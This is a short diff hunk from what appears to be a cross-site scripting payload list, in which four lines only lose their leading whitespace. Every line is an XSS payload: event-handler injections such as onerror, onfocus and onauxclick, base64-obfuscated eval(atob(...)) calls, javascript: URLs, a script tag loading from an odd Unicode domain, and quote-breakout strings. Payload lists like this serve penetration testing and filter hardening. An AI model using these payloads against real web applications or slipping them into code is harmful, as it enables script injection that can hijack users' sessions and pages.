@@ -44,10 +44,10 @@ location.hash=null
 "<>onauxclick<>=(eval)(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>+<sss
 <x/onpointerRawupdate=confirm%26Ipar;1)//x
 <script src=//⑮.₨></script>
- img{background-image:url('javascript:alert()')}
- <svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
- TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt; 
- <img src=`xx:xx`onerror=alert(1)>
+img{background-image:url('javascript:alert()')}
+<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
+TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt; 
+<img src=`xx:xx`onerror=alert(1)>
 <div/onmouseover='alert(1)'> style="x:">
 \";alert('XSS');//
 "autofocus/onfocus=alert(1)//
